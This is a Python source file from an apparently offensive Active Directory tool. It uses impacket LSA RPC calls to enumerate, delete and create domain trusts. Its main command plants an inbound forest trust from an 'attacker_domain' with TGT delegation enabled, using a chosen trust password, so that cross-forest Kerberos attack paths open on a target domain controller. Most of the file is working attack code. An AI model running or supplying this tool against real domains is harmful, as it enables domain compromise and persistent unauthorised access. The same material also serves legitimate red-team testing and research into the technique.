import datetime
import traceback
from argparse import Namespace
from typing import Any

from impacket import nt_errors
from impacket.dcerpc.v5 import lsad
from impacket.dcerpc.v5.dtypes import (
    ACCESS_MASK,
    BOOLEAN,
    LARGE_INTEGER,
    NTSTATUS,
    NULL,
    RPC_SID,
    RPC_UNICODE_STRING,
    ULONG,
)
from impacket.dcerpc.v5.lsad import (
    LSA_FOREST_TRUST_RECORD_TYPE,
    LSAPR_AUTH_INFORMATION,
    LSAPR_HANDLE,
    LSAPR_TRUSTED_DOMAIN_AUTH_INFORMATION,
    LSAPR_TRUSTED_DOMAIN_INFORMATION_EX,
    DCERPCSessionError,  # noqa: F401
)
from impacket.dcerpc.v5.ndr import NDRCALL, NDRPOINTER, NDRSTRUCT, NDRUniConformantArray
from impacket.dcerpc.v5.rpcrt import DCERPCException

from aorta.transport import connect

# impacket's DCERPC.request() resolves the exception class via
# getattr(sys.modules[request.__module__], 'DCERPCSessionError') for NTSTATUS
# codes absent from rpc_status_codes (e.g. OBJECT_NAME_COLLISION). Our request
# classes live in this module, so this name must exist here too.

TRUST_DIRECTION_INBOUND = 1
TRUST_TYPE_UPLEVEL = 2
TRUST_ATTRIBUTES_AORTA = 0x808  # FOREST_TRANSITIVE | ENABLE_TGT_DELEGATION

TRUSTED_ALL_ACCESS = 0x000F003F
DELETE_ACCESS = 0x00010000  # DELETE

STATUS_ACCESS_DENIED = 0xC0000022
STATUS_INVALID_DOMAIN_STATE = 0xC00000DD
STATUS_OBJECT_NAME_COLLISION = 0xC0000035
STATUS_NO_MORE_ENTRIES = 0x8000001A  # empty enumeration


TRUST_DIRECTIONS = {0: "disabled", 1: "inbound", 2: "outbound", 3: "bidirectional"}
TRUST_TYPES = {1: "downlevel (NT4)", 2: "uplevel (2000+)", 3: "MIT", 4: "DCE"}
TRUST_ATTRIBUTES = {
    0x00000001: "NON_TRANSITIVE",
    0x00000002: "UPLEVEL_ONLY",
    0x00000004: "QUARANTINED_DOMAIN",
    0x00000008: "FOREST_TRANSITIVE",
    0x00000010: "CROSS_ORGANIZATION (selective-auth)",
    0x00000020: "WITHIN_FOREST",
    0x00000040: "TREAT_AS_EXTERNAL",
    0x00000080: "USES_RC4_ENCRYPTION",
    0x00000200: "CROSS_ORGANIZATION_NO_TGT_DELEGATION",
    0x00000800: "CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION",
}
ATTR_FOREST_TRANSITIVE = 0x008
ATTR_TGT_DELEGATION = 0x800
ATTR_NO_TGT_DELEGATION = 0x200


def decode_direction(v: int) -> str:
    return TRUST_DIRECTIONS.get(v, f"unknown({v})")


def decode_type(v: int) -> str:
    return TRUST_TYPES.get(v, f"unknown({v})")


def decode_attributes(v: int) -> list[tuple[int, str]]:
    flags = [(bit, name) for bit, name in TRUST_ATTRIBUTES.items() if v & bit]
    unknown = v & ~sum(bit for bit, _ in flags)
    if unknown:
        flags.append((unknown, "RESERVED/UNKNOWN"))
    return flags


def aorta_posture(attrs: int) -> str:
    if attrs & ATTR_FOREST_TRANSITIVE and attrs & ATTR_TGT_DELEGATION and not attrs & ATTR_NO_TGT_DELEGATION:
        return "AORTA-viable: forest-transitive + TGT delegation ENABLED"
    if attrs & ATTR_NO_TGT_DELEGATION:
        return "TGT delegation explicitly DISABLED (NO_TGT_DELEGATION)"
    if attrs & ATTR_TGT_DELEGATION and not attrs & ATTR_FOREST_TRANSITIVE:
        return "TGT delegation set but NOT forest-transitive"
    return "not AORTA-relevant"


# ===========================================================================
#  Trust RPC stubs (LsarCreateTrustedDomainEx not in impacket's lsad)
# ===========================================================================


class PLSAPR_TRUSTED_DOMAIN_INFORMATION_EX(NDRPOINTER):
    referent = (("Data", LSAPR_TRUSTED_DOMAIN_INFORMATION_EX),)


class LsarCreateTrustedDomainEx(NDRCALL):
    opnum = 51
    structure = (
        ("PolicyHandle", LSAPR_HANDLE),
        ("TrustedDomainInformation", LSAPR_TRUSTED_DOMAIN_INFORMATION_EX),
        ("AuthenticationInformation", LSAPR_TRUSTED_DOMAIN_AUTH_INFORMATION),
        ("DesiredAccess", ACCESS_MASK),
    )


class LsarCreateTrustedDomainExResponse(NDRCALL):
    structure = (("TrustedDomainHandle", LSAPR_HANDLE), ("ErrorCode", NTSTATUS))


class LsarOpenTrustedDomain(NDRCALL):
    opnum = 25
    structure = (
        ("PolicyHandle", LSAPR_HANDLE),
        ("TrustedDomainSid", RPC_SID),
        ("DesiredAccess", ACCESS_MASK),
    )


class LsarOpenTrustedDomainResponse(NDRCALL):
    structure = (("TrustedDomainHandle", LSAPR_HANDLE), ("ErrorCode", NTSTATUS))


class LsarDeleteObject(NDRCALL):
    opnum = 34
    structure = (("ObjectHandle", LSAPR_HANDLE),)


class LsarDeleteObjectResponse(NDRCALL):
    structure = (("ObjectHandle", LSAPR_HANDLE), ("ErrorCode", NTSTATUS))


def make_rpc_sid(sid_str: str) -> RPC_SID:
    parts = sid_str.split("-")
    sid = RPC_SID()
    sid["Revision"] = int(parts[1])
    sid["SubAuthorityCount"] = len(parts) - 3
    sid["IdentifierAuthority"] = b"\x00\x00\x00\x00\x00" + bytes([int(parts[2])])
    sid["SubAuthority"] = [int(x) for x in parts[3:]]
    return sid


# ===========================================================================
#  Forest trust info (LsarSetForestTrustInformation opnum 74)
#
#  Trustify calls LsaSetForestTrustInformation right after creating the trust
#  to attach the forest-trust top-level-name record. Without this step the
#  trust object is not a functional *forest* trust (msDS-TrustForestTrustInfo
#  stays empty) and the cross-forest Kerberos chain (the AORTA TGT delegation
#  path) does not complete.
#
#  Wire-format notes (validated against a live DC and the Samba lsarpc.idl):
#    * LSA_FOREST_TRUST_DATA is an ENCAPSULATED union (switch_type): the record
#      carries a 4-byte switch tag right before the arm data. impacket's
#      LSA_FOREST_TRUST_DATA_UNION omits it, so we inline it as UnionTag.
#    * strings use MaximumLength = Length + 2 and WSTR MaximumCount = chars+1
#      (NUL-inclusive) -- see make_trust_string().
# ===========================================================================


class LSA_FOREST_TRUST_RECORD(NDRSTRUCT):
    structure = (
        ("Flags", ULONG),
        ("ForestTrustType", LSA_FOREST_TRUST_RECORD_TYPE),
        ("Time", LARGE_INTEGER),
        ("UnionTag", ULONG),  # encapsulated-union switch (ForestTrustTopLevelName=0)
        ("TopLevelName", RPC_UNICODE_STRING),
    )


class PLSA_FOREST_TRUST_RECORD(NDRPOINTER):
    referent = (("Data", LSA_FOREST_TRUST_RECORD),)


class LSA_FOREST_TRUST_RECORD_ARRAY(NDRUniConformantArray):
    item = PLSA_FOREST_TRUST_RECORD


class PLSA_FOREST_TRUST_RECORD_ARRAY(NDRPOINTER):
    referent = (("Data", LSA_FOREST_TRUST_RECORD_ARRAY),)


class LSA_FOREST_TRUST_INFORMATION(NDRSTRUCT):
    structure = (
        ("RecordCount", ULONG),
        ("Entries", PLSA_FOREST_TRUST_RECORD_ARRAY),
    )


class LSA_FOREST_TRUST_COLLISION_INFORMATION(NDRSTRUCT):
    structure = (
        ("RecordCount", ULONG),
        ("Entries", NDRPOINTER),  # only parsed when the pointer is non-NULL
    )


class PLSA_FOREST_TRUST_COLLISION_INFORMATION(NDRPOINTER):
    referent = (("Data", LSA_FOREST_TRUST_COLLISION_INFORMATION),)


class LsarSetForestTrustInformation(NDRCALL):
    opnum = 74
    structure = (
        ("PolicyHandle", LSAPR_HANDLE),
        ("TrustedDomainName", RPC_UNICODE_STRING),
        ("HighestRecordType", LSA_FOREST_TRUST_RECORD_TYPE),
        ("ForestTrustInfo", LSA_FOREST_TRUST_INFORMATION),
        ("CheckOnly", BOOLEAN),
    )


class LsarSetForestTrustInformationResponse(NDRCALL):
    structure = (
        ("CollisionInfo", PLSA_FOREST_TRUST_COLLISION_INFORMATION),
        ("ErrorCode", NTSTATUS),
    )


def filetime_now() -> int:
    epoch = datetime.datetime(1601, 1, 1, tzinfo=datetime.UTC)
    delta = datetime.datetime.now(datetime.UTC) - epoch
    return int(delta.total_seconds() * 10_000_000)


def make_trust_string(s: str) -> RPC_UNICODE_STRING:
    # RPC_UNICODE_STRING with the NUL-inclusive conventions Windows uses for
    # trust/forest-trust strings: MaximumLength = Length + 2 and WSTR
    # MaximumCount = chars + 1 (impacket's defaults omit the terminator).
    u = RPC_UNICODE_STRING()
    u["Data"] = s
    u.fields["MaximumLength"] = len(s) * 2 + 2
    data_member: Any = u.fields["Data"]
    wstr: Any = data_member.fields["Data"]  # LPWSTR -> WSTR
    wstr.fields["MaximumCount"] = len(s) + 1
    return u


def set_forest_trust_info(dce: Any, policy_handle: Any, domain_name: str) -> Any:
    # Attach the forest-trust top-level-name record for `domain_name`
    # (LsarSetForestTrustInformation opnum 74), mirroring Trustify's
    # SetDomainTrust step.
    rec = LSA_FOREST_TRUST_RECORD()
    rec["Flags"] = 0
    rec["ForestTrustType"] = 0  # ForestTrustTopLevelName
    rec["Time"] = filetime_now()
    rec["UnionTag"] = 0
    rec["TopLevelName"] = make_trust_string(domain_name)

    info = LSA_FOREST_TRUST_INFORMATION()
    info["RecordCount"] = 1
    p = PLSA_FOREST_TRUST_RECORD()
    p["Data"] = rec
    info["Entries"] = [p]

    request = LsarSetForestTrustInformation()
    request["PolicyHandle"] = policy_handle
    request["TrustedDomainName"] = make_trust_string(domain_name)
    request["HighestRecordType"] = 0
    request["ForestTrustInfo"] = info
    request["CheckOnly"] = 0
    return dce.request(request)


def do_set_forest_trust_info(dce: Any, policy_handle: Any, domain_name: str) -> bool:
    print("[*] Setting forest trust info (LsarSetForestTrustInformation opnum 74)...")
    try:
        resp = set_forest_trust_info(dce, policy_handle, domain_name)
    except DCERPCException as e:
        code = getattr(e, "error_code", None)
        print(
            f"[-] LsarSetForestTrustInformation failed: 0x{code:08x} {e}"
            if code
            else f"[-] LsarSetForestTrustInformation failed: {e}"
        )
        return False
    code = resp["ErrorCode"] & 0xFFFFFFFF
    if code == 0:
        print(f"[+] Forest trust info set (top-level name: {domain_name})")
        return True
    print(f"[-] LsarSetForestTrustInformation failed: 0x{code:08x}")
    return False


def get_trusts(dce: Any, policy_handle: Any) -> list[Any]:
    try:
        resp = lsad.hLsarEnumerateTrustedDomainsEx(dce, policy_handle)
    except DCERPCException as e:
        if getattr(e, "error_code", None) == STATUS_NO_MORE_ENTRIES:
            return []
        raise
    buf = resp["EnumerationBuffer"]
    if not buf["Entries"]:
        return []
    return list(buf["EnumerationBuffer"])


def print_trust(idx: int, e: Any) -> None:
    sid = e["Sid"]
    sid_str = sid.formatCanonical() if sid is not None else "(none)"
    attrs = e["TrustAttributes"]
    print(f"    [{idx}] {e['Name']} ({e['FlatName']})")
    print(f"        SID:         {sid_str}")
    print(f"        Direction:   {decode_direction(e['TrustDirection'])} ({e['TrustDirection']})")
    print(f"        Type:        {decode_type(e['TrustType'])} ({e['TrustType']})")
    print(f"        Attributes:  0x{attrs:x}")
    for bit, name in decode_attributes(attrs):
        print(f"            {name} (0x{bit:03x})")
    print(f"        => {aorta_posture(attrs)}")
    print()


def delete_trust_by_sid(dce: Any, policy_handle: Any, sid_str: str) -> None:
    open_req = LsarOpenTrustedDomain()
    open_req["PolicyHandle"] = policy_handle
    open_req["TrustedDomainSid"] = make_rpc_sid(sid_str)
    open_req["DesiredAccess"] = DELETE_ACCESS
    td_handle = dce.request(open_req)["TrustedDomainHandle"]
    del_req = LsarDeleteObject()
    del_req["ObjectHandle"] = td_handle
    dce.request(del_req)


def build_create_request(policy_handle: Any, args: Namespace) -> LsarCreateTrustedDomainEx:
    tdi = LSAPR_TRUSTED_DOMAIN_INFORMATION_EX()
    tdi["Name"] = args.attacker_domain
    tdi["FlatName"] = args.attacker_netbios
    tdi["Sid"] = make_rpc_sid(args.attacker_sid)
    tdi["TrustDirection"] = TRUST_DIRECTION_INBOUND
    tdi["TrustType"] = TRUST_TYPE_UPLEVEL
    tdi["TrustAttributes"] = TRUST_ATTRIBUTES_AORTA

    auth_info = LSAPR_AUTH_INFORMATION()
    auth_info["LastUpdateTime"] = 0
    auth_info["AuthType"] = 2  # TRUST_AUTH_TYPE_CLEAR (MS-LSAD 2.2.2.5: 0x2 = plaintext password)
    pwd_bytes = args.trust_password.encode("utf-16-le")
    auth_info["AuthInfoLength"] = len(pwd_bytes)
    auth_info["AuthInfo"] = pwd_bytes

    tai = LSAPR_TRUSTED_DOMAIN_AUTH_INFORMATION()
    tai["IncomingAuthInfos"] = 1
    tai["IncomingAuthenticationInformation"] = auth_info
    tai["IncomingPreviousAuthenticationInformation"] = NULL
    tai["OutgoingAuthInfos"] = 0
    tai["OutgoingAuthenticationInformation"] = NULL
    tai["OutgoingPreviousAuthenticationInformation"] = NULL

    request = LsarCreateTrustedDomainEx()
    request["PolicyHandle"] = policy_handle
    request["TrustedDomainInformation"] = tdi
    request["AuthenticationInformation"] = tai
    request["DesiredAccess"] = TRUSTED_ALL_ACCESS
    return request


def handle_create_error(exc: Exception) -> int | None:
    error_code = getattr(exc, "error_code", None)
    print(f"[-] LsarCreateTrustedDomainEx failed: {exc}")
    if error_code:
        status_name, status_desc = nt_errors.ERROR_MESSAGES.get(error_code, ("Unknown", ""))
        print(f"[-] Status: 0x{error_code:08x} - {status_name}: {status_desc}")
        if error_code == STATUS_ACCESS_DENIED:
            print("[*] ACCESS_DENIED - is Incoming Forest Trust Builders membership active?")
        elif error_code == STATUS_INVALID_DOMAIN_STATE:
            print("[*] INVALID_DOMAIN_STATE - domain functional level may not support this")
        elif error_code == STATUS_OBJECT_NAME_COLLISION:
            print("[*] OBJECT_NAME_COLLISION - trust already exists (use --force to replace)")
    return error_code


def show_trusts(dce: Any, policy_handle: Any) -> None:
    trusts = get_trusts(dce, policy_handle)
    print(f"[+] Total trusts: {len(trusts)}\n")
    for i, e in enumerate(trusts, 1):
        print_trust(i, e)


def cmd_trust_list(args: Namespace) -> None:
    dce, policy_handle = connect(args)
    try:
        print(f"[*] Enumerating trusted domains on {args.dc} ...")
        show_trusts(dce, policy_handle)
    finally:
        dce.disconnect()


def cmd_trust_delete(args: Namespace) -> None:
    dce, policy_handle = connect(args)
    try:
        if args.all:
            trusts = get_trusts(dce, policy_handle)
            if not trusts:
                print("[*] No trusts to delete")
                return
            for e in trusts:
                sid_str = e["Sid"].formatCanonical()
                print(f"[*] Deleting {e['Name']} ({sid_str})")
                delete_trust_by_sid(dce, policy_handle, sid_str)
                print("[+] Deleted")
        else:
            print(f"[*] Deleting trust with SID {args.sid}")
            delete_trust_by_sid(dce, policy_handle, args.sid)
            print("[+] Deleted")
    finally:
        dce.disconnect()


def cmd_trust_add(args: Namespace) -> None:
    print(f"[*] Adding AORTA trust: {args.attacker_domain} (0x{TRUST_ATTRIBUTES_AORTA:x}) -> {args.domain}")
    dce, policy_handle = connect(args)
    try:
        _trust_do_add(dce, policy_handle, args)
    finally:
        dce.disconnect()


def _trust_do_add(dce: Any, policy_handle: Any, args: Namespace) -> None:
    request = build_create_request(policy_handle, args)
    print("[*] Sending LsarCreateTrustedDomainEx (opnum 51)...")
    code: int | None
    try:
        dce.request(request)
        print("[+] TRUST CREATED")
        print(f"[+] Inbound forest trust: {args.attacker_domain} -> {args.domain}")
        print(f"[+] TGT delegation ENABLED (trustAttributes 0x{TRUST_ATTRIBUTES_AORTA:x})")
        do_set_forest_trust_info(dce, policy_handle, args.attacker_domain)
        print("\n[*] Current trust state:")
        show_trusts(dce, policy_handle)
        return
    except DCERPCException as e:
        code = handle_create_error(e)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        traceback.print_exc()
        return

    if code == STATUS_OBJECT_NAME_COLLISION:
        if not args.force:
            print("[-] Aborting; pass --force to replace the existing trust")
            return
        print(f"[*] --force: deleting existing trust {args.attacker_sid} and recreating")
        try:
            delete_trust_by_sid(dce, policy_handle, args.attacker_sid)
            print("[+] Existing trust deleted")
        except Exception as e:
            print(f"[-] Force-delete failed: {e}")
            return
        print("[*] Recreating trust...")
        try:
            dce.request(request)
            print("[+] TRUST CREATED (after --force replace)")
            print(f"[+] Inbound forest trust: {args.attacker_domain} -> {args.domain}")
            print(f"[+] TGT delegation ENABLED (trustAttributes 0x{TRUST_ATTRIBUTES_AORTA:x})")
            do_set_forest_trust_info(dce, policy_handle, args.attacker_domain)
            print("\n[*] Current trust state:")
            show_trusts(dce, policy_handle)
        except DCERPCException as e:
            handle_create_error(e)
